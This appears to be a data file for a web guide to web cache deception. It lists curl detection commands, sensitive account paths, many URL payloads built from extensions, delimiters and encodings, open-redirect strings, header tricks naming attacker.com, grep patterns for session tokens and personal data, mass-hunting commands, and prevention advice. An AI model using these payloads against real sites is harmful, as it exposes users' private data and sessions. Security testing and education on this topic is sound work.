export const guideItems = [
  "Web Cache Deception fundamentals",
  "How WCD works and its impact",
  "Cache keys and caching behavior",
  "Cache detection and manual verification",
  "Advanced bypass techniques and special headers",
  "Encoded paths and query parameter manipulation",
  "Extensive payloads, delimiters, and URL tricks",
  "Step-by-step exploitation methodology",
  "Real-world attack examples",
  "Mass hunting and automation commands",
  "Prevention and mitigation strategies",
  "Recommended tools and practice labs",
]

export const impactItems = [
  "Exposure of personal information",
  "Session hijacking",
  "Authentication bypass",
  "Complete account takeover",
]

export const cacheTypes = [
  { type: "Browser Caches", desc: "Store resources locally on a user's device" },
  { type: "CDN Caches", desc: "Distributed caches at edge locations for faster delivery" },
  { type: "Reverse Proxy Caches", desc: "Server-side caches that reduce origin server load" },
]

export const cacheControlHeaders = [
  { header: "Cache-Control", purpose: "Directives for caching mechanisms" },
  { header: "Pragma", purpose: "HTTP/1.0 header for cache control" },
  { header: "Expires", purpose: "Specifies when the response expires" },
  { header: "ETag", purpose: "Identifier for a specific version of a resource" },
  { header: "Last-Modified", purpose: "Indicates when the resource was last modified" },
]

export const analysisHeaders = [
  { header: "Cache-Control", lookFor: "no-store, no-cache (sensitive); public, max-age=86400 (cached)" },
  { header: "Expires", lookFor: "Future date → likely cached until then" },
  { header: "ETag", lookFor: "Present → can validate/compare versions" },
  { header: "Last-Modified", lookFor: "Recent timestamp vs. origin changes" },
  { header: "Vary", lookFor: "Vary: Cookie or missing → important for auth-sensitive content" },
  { header: "X-Cache", lookFor: "HIT = served from cache, MISS = not cached" },
  { header: "Age", lookFor: "Age > 0 → response came from cache" },
  { header: "Pragma", lookFor: "Pragma: no-cache → indicates no-cache" },
  { header: "Surrogate-Control", lookFor: "max-age=... or no-store for CDNs" },
  { header: "X-Served-By", lookFor: "Identifies the server/CDN node that served the request" },
  { header: "CF-Cache-Status", lookFor: "HIT, MISS, EXPIRED, BYPASS (Cloudflare)" },
  { header: "X-Cache-Status", lookFor: "HIT / MISS / STALE / BYPASS" },
]

export const detectionCommands = [
  { cmd: "curl -I https://target.com/account.css", desc: "Check if URL is cached — look for X-Cache: HIT, Age > 0", idx: 2 },
  { cmd: "curl -I -H 'Cache-Control: no-cache' https://target.com/account.css", desc: "Send request with cache bypass header", idx: 3 },
  { cmd: "curl -I https://target.com/account.css ; curl -I https://target.com/account.css?v=$(date +%s)", desc: "Cache busting — add unique query parameters", idx: 4 },
  { cmd: "time curl -s -o /dev/null -w '%{time_total}' https://target.com/account.css", desc: "Timing analysis — cached responses are faster", idx: 5 },
  { cmd: "curl -s -D - https://target.com/account.css -o /dev/null | grep -iE 'x-cache|cf-cache|age:|cache-control|expires|etag'", desc: "Extract all cache-related headers", idx: 6 },
]

export const sensitivePaths = [
  "/account", "/profile", "/dashboard", "/settings", "/user", "/admin", "/private",
  "/my-account", "/user/profile", "/dashboard/image", "/dashboard/profile", "/account/user",
  "/address", "/account/settings", "/profile/edit", "/user/settings", "/admin/panel",
  "/private/files", "/my-account/orders", "/user/details", "/dashboard/reports",
  "/account/profile", "/account/info", "/profile/view", "/admin/settings", "/private/data",
  "/my-account/settings", "/user/account",
]

export const extensions = [
  ".css", ".js", ".svg", ".asp", ".aspx", ".atom", ".bak", ".bin", ".cgi", ".csv", ".do",
  ".eot", ".exe", ".fake.js", ".gif", ".html", ".ico", ".jpg", ".jpeg", ".json", ".jsp",
  ".mp3", ".mp4", ".old", ".pdf", ".php", ".png", ".rss", ".tar.gz", ".tmp", ".ttf",
  ".txt", ".webm", ".woff", ".woff2", ".xml", ".zip", ".7z",
]

export const extensionAppends = [
  "/dashboard.png", "/user.js", "/admin.css", "/orders.jpg",
]

export const fakeDirectories = [
  "/admin.css/login", "/account.js/test", "/settings/fake.js", "/orders/test/style.css",
]

export const pathPoisonUrls = [
  "https://target.com/account.css",
  "https://target.com/profile.html",
]

export const obfuscatedPaths = [
  "https://target.com/account%2fstyle.css",
  "https://target.com/profile%3ftest=1.js",
]

export const delimiterUrls = [
  "https://target.com/account;random.js",
  "https://target.com/profile@anything.css",
]

export const specialHeaders = [
  "X-Original-URL: /admin/", "X-Rewrite-URL: /profile/",
  "X-Forwarded-Host: attacker.com", "X-Forwarded-Path: /static.css",
  "curl -H 'X-Original-URL: /admin/' https://target.com/dashboard/style.css",
  "curl -H 'X-Forwarded-Path: /static.css' https://target.com/account",
]

export const encodedPaths = [
  "https://target.com/settings/%2e%2e/images/logo.png",
  "https://target.com/admin/%2e%2e/scripts/app.js",
  "https://target.com/profile/%2e%2e/assets/styles.css",
  "https://target.com/billing/%2e%2e/fonts/main.woff",
  "https://target.com/api/v2/orders/%2e%2e/public/data.json",
  "https://target.com/user/%2e%2e/favicon.ico",
]

export const cacheKeyPayloads = [
  ".js?test=123", ".css?test=123", ".jpeg?test=123", ".jpg?test=123",
  ".png?test=123", ".gif?test=123", ".woff?test=123", ".woff2?test=123",
  ".ttf?test=123", ".otf?test=123", ".svg?test=123", ".html?test=123",
  ".xml?test=123", ".json?test=123", ".mp4?test=123", ".webm?test=123",
  ".ico?test=123", ".txt?test=123", ".pdf?test=123", ".doc?test=123",
  ".xls?test=123", ".ppt?test=123", ".mp3?test=123", ".ogg?test=123",
  ".wav?test=123", ".csv?test=123", ".swf?test=123", ".zip?test=123",
  ".tar?test=123", ".gz?test=123", ".bz2?test=123", ".7z?test=123",
  ".webp?test=123", ".bmp?test=123", ".mpg?test=123", ".avi?test=123",
  ".mkv?test=123", ".flv?test=123", ".wmv?test=123", ".weba?test=123",
  ".srt?test=123", ".vtt?test=123", ".rss?test=123", ".atom?test=123",
  ".yaml?test=123", ".log?test=123", ".jar?test=123", ".plist?test=123",
  ".jsp?test=123", ".aspx?test=123", ".shtml?test=123", ".map?test=123",
]

export const cacheKeyUrls = [
  "https://target.com/account?file=main.js",
  "https://target.com/settings?theme=dark.css",
  "https://target.com/user?resource=profile.jpg",
  "https://target.com/admin?view=dashboard.png",
  "https://target.com/api?callback=static.js",
  "https://target.com/profile.js?test=123",
  "https://target.com/account.css?test=123",
  "https://target.com/settings.jpeg?test=123",
  "https://target.com/dashboard.jpg?test=123",
]

export const openRedirectPayloads = [
  "//google.com/%2f..", "//www.whitelisteddomain.tld@google.com/%2f..",
  "///google.com/%2f..", "///www.whitelisteddomain.tld@google.com/%2f..",
  "////google.com/%2f..", "////www.whitelisteddomain.tld@google.com/%2f..",
  "https://google.com/%2f..", "https://www.whitelisteddomain.tld@google.com/%2f..",
  "/https://google.com/%2f..", "/https://www.whitelisteddomain.tld@google.com/%2f..",
  "//www.google.com/%2f%2e%2e", "//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "///www.google.com/%2f%2e%2e", "///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "////www.google.com/%2f%2e%2e", "////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "https://www.google.com/%2f%2e%2e", "https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "/https://www.google.com/%2f%2e%2e", "/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "//google.com/", "//www.whitelisteddomain.tld@google.com/",
  "///google.com/", "///www.whitelisteddomain.tld@google.com/",
  "////google.com/", "////www.whitelisteddomain.tld@google.com/",
  "https://google.com/", "https://www.whitelisteddomain.tld@google.com/",
  "/https://google.com/", "/https://www.whitelisteddomain.tld@google.com/",
  "//www.google.com/%2e%2e", "//www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "///www.google.com/%2e%2e", "///www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "////www.google.com/%2e%2e", "////www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "https://www.google.com/%2e%2e", "https://www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "/https://www.google.com/%2e%2e", "/https://www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "//www.google.com", "//www.whitelisteddomain.tld@google.com",
  "///www.google.com", "///www.whitelisteddomain.tld@google.com",
  "////www.google.com", "////www.whitelisteddomain.tld@google.com",
  "https://www.google.com", "https://www.whitelisteddomain.tld@google.com",
  "/https://www.google.com", "/https://www.whitelisteddomain.tld@google.com",
  "//google.com/%2f%2e%2e%2f%2e%2e",
  "//www.whitelisteddomain.tld@google.com/%2f%2e%2e%2f%2e%2e",
  "///google.com/%2f%2e%2e%2f%2e%2e",
  "///www.whitelisteddomain.tld@google.com/%2f%2e%2e%2f%2e%2e",
  "////google.com/%2f%2e%2e%2f%2e%2e",
  "////www.whitelisteddomain.tld@google.com/%2f%2e%2e%2f%2e%2e",
  "https://google.com/%2f%2e%2e%2f%2e%2e",
  "https://www.whitelisteddomain.tld@google.com/%2f%2e%2e%2f%2e%2e",
  "/https://google.com/%2f%2e%2e%2f%2e%2e",
  "/https://www.whitelisteddomain.tld@google.com/%2f%2e%2e%2f%2e%2e",
]

export const delimiters = [
  "~", "\\/", "\\", ";", ":", "//", "/", "..", ".", "_", "-", "@", "?", "=",
  "#", "##", "!*", "!", "&", "$",
]

export const encodedDelimiters = [
  "%5c", "%3d", "%2f", "%2e", "%26", "%23", "%20", "%0a", "%09", "%00",
]

export const delimiterExamples = [
  "https://target.com/account~style.css", "https://target.com/profile\\/test.js",
  "https://target.com/settings\\backup.jpg", "https://target.com/dashboard;v2.png",
  "https://target.com/user:data.css", "https://target.com/admin//panel.js",
  "https://target.com/private/../secret.css", "https://target.com/profile.edit.jpg",
  "https://target.com/user_name-test.gif", "https://target.com/account@cache.png",
  "https://target.com/profile?version=1.css", "https://target.com/settings=value.js",
  "https://target.com/dashboard#section.css", "https://target.com/user##details.js",
  "https://target.com/admin!*test.jpg", "https://target.com/private!cache.gif",
  "https://target.com/profile&token=123.css", "https://target.com/account$hidden.js",
  "https://target.com/settings%5cencoded.jpg", "https://target.com/dashboard%3dversion.css",
  "https://target.com/user%2ffile.js", "https://target.com/admin%2eedit.png",
  "https://target.com/private%26data.css", "https://target.com/profile%23hash.js",
  "https://target.com/account%20space.jpg", "https://target.com/settings%0abypass.css",
  "https://target.com/dashboard%09test.svg", "https://target.com/user%00null.html",
]

export const semiExtList = [
  ";.js?test=123", ";.css?test=123", ";.jpeg?test=123", ";.jpg?test=123",
  ";.png?test=123", ";.gif?test=123", ";.woff?test=123", ";.woff2?test=123",
  ";.ttf?test=123", ";.otf?test=123", ";.svg?test=123", ";.html?test=123",
  ";.xml?test=123", ";.json?test=123", ";.mp4?test=123", ";.ico?test=123",
  ";.txt?test=123", ";.pdf?test=123", ";.zip?test=123", ";.csv?test=123",
]

export const semiExtUrls = [
  "https://target.com/account;.js?test=123", "https://target.com/profile;.css?test=123",
  "https://target.com/settings;.jpeg?test=123", "https://target.com/dashboard;.jpg?test=123",
  "https://target.com/user;.png?test=123", "https://target.com/admin;.gif?test=123",
  "https://target.com/private;.woff?test=123", "https://target.com/account;.woff2?test=123",
  "https://target.com/profile;.ttf?test=123", "https://target.com/settings;.otf?test=123",
  "https://target.com/dashboard;.svg?test=123", "https://target.com/user;.html?test=123",
  "https://target.com/admin;.xml?test=123", "https://target.com/private;.json?test=123",
]

export const encodedExtList = [
  "%60.js?test=123", "%60.css?test=123", "%60.jpeg?test=123", "%60.jpg?test=123",
  "%60.png?test=123", "%60.gif?test=123", "%60.woff?test=123", "%60.woff2?test=123",
  "%60.ttf?test=123", "%60.otf?test=123", "%60.svg?test=123", "%60.html?test=123",
  "%60.xml?test=123", "%60.json?test=123", "%60.mp4?test=123", "%60.ico?test=123",
  "%60.txt?test=123", "%60.pdf?test=123", "%60.zip?test=123", "%60.csv?test=123",
]

export const encodedExtUrls = [
  "https://target.com/account%60.js?test=123", "https://target.com/profile%60.css?test=123",
  "https://target.com/settings%60.jpeg?test=123", "https://target.com/dashboard%60.jpg?test=123",
  "https://target.com/user%60.png?test=123", "https://target.com/admin%60.gif?test=123",
  "https://target.com/private%60.woff?test=123", "https://target.com/account%60.woff2?test=123",
  "https://target.com/profile%60.ttf?test=123", "https://target.com/settings%60.otf?test=123",
  "https://target.com/dashboard%60.svg?test=123", "https://target.com/user%60.html?test=123",
  "https://target.com/admin%60.xml?test=123", "https://target.com/private%60.json?test=123",
]

export const extStarList = [
  ".js/*", ".css/*", ".jpeg/*", ".jpg/*", ".png/*", ".gif/*", ".woff/*", ".woff2/*",
  ".ttf/*", ".otf/*", ".svg/*", ".html/*", ".xml/*", ".json/*", ".mp4/*", ".webm/*",
  ".ico/*", ".txt/*", ".pdf/*", ".doc/*", ".xls/*", ".ppt/*", ".mp3/*", ".ogg/*",
  ".wav/*", ".csv/*", ".zip/*", ".tar/*", ".gz/*", ".bz2/*", ".7z/*", ".webp/*",
  ".bmp/*", ".mpg/*", ".avi/*", ".mkv/*", ".flv/*", ".wmv/*", ".rss/*", ".atom/*",
  ".yaml/*", ".log/*", ".jar/*", ".jsp/*", ".aspx/*", ".shtml/*", ".xhtml/*", ".map/*",
]

export const extStarUrls = [
  "https://target.com/account.js/*", "https://target.com/profile.css/*",
  "https://target.com/settings.jpeg/*", "https://target.com/dashboard.jpg/*",
  "https://target.com/user.png/*", "https://target.com/admin.gif/*",
  "https://target.com/private.woff/*", "https://target.com/account.woff2/*",
  "https://target.com/profile.ttf/*", "https://target.com/settings.otf/*",
  "https://target.com/dashboard.svg/*", "https://target.com/user.html/*",
  "https://target.com/admin.xml/*", "https://target.com/private.json/*",
]

export const realWorldProfile = [
  "curl -I https://target.com/user/profile.css",
  "curl https://target.com/user/profile.css | grep -iE 'email|username|session|token|ssn|credit|phone'",
]

export const realWorldApi = [
  "curl -I 'https://target.com/api/user/data?callback=static.js'",
  "curl 'https://target.com/api/user/data?callback=static.js'",
]

export const automationCommands = [
  "gau target.com | grep -E '/(account|profile|dashboard|settings|user|admin|private|my-account|user/profile|dashboard/image|dashboard/profile|account/user|address|account/settings|profile/edit|user/settings|admin/panel|private/files|my-account/orders|user/details|dashboard/reports|account/profile|account/info|profile/view|admin/settings|private/data|my-account/settings|user/account)(\\?|/|$)' {'>'} urls.txt",
  "cat urls.txt | while read url; do echo \"$url/style.css\"; done | httpx-toolkit -mc 200 -title -cl",
]

export const toolLinks = [
  { href: "https://github.com/PortSwigger/web-cache-deception-scanner", label: "Web Cache Deception Scanner (PortSwigger)", desc: "Burp Suite extension for automated web cache deception scanning" },
  { href: "https://portswigger.net/web-security/web-cache-deception", label: "PortSwigger WCD Lab", desc: "Interactive practice lab for web cache deception" },
  { href: "https://www.giftofspeed.com/cache-checker/", label: "GiftOfSpeed Cache Checker", desc: "Online tool to analyze HTTP responses and determine if a resource is cached" },
  { href: "https://www.youtube.com/watch?v=Epzi1fWwdKk", label: "YouTube: Full WCD Walkthrough", desc: "Full practical demonstration including account takeover via cache deception" },
]

export const preventionItems = [
  { title: "Proper Cache-Control Headers", desc: "Ensure sensitive endpoints include: Cache-Control: no-store, no-cache, private" },
  { title: "Cache Key Configuration", desc: "Configure caches to include authentication status or session identifiers in cache keys" },
  { title: "URL Normalization", desc: "Implement URL normalization to prevent encoded paths from bypassing cache rules" },
  { title: "Static Resource Segregation", desc: "Host static resources on separate domains or subdomains with different caching policies" },
]
